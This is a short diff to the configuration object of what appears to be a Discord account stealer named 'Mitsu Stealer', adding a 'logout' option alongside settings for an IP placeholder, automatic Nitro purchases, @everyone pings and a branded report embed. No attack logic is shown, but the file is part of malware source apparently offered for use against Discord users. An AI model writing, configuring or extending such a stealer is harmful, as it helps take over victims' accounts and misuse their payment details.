@@ -10,6 +10,7 @@ const config = {
   ip: '%IP%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
+  logout: true, 
   ping_val: '@everyone', 
   embed_name: 'Mitsu Stealer', 
   embed_icon: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
